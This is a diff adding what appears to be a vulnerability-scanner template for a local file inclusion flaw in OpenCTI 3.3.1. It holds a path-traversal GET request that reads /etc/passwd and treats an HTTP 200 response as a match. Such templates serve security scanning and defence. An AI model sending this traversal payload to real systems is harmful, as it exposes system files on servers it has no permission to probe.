@@ -1,0 +1,20 @@
+id: opencti-lfi
+brief:
+    title: OpenCTI 3.3.1 - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: OpenCTI 3.3.1 is vulnerable to local file inclusion.
+    label:
+        - opencti
+        - lfi
+        - oss
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/static/css//../../../../../../../../etc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
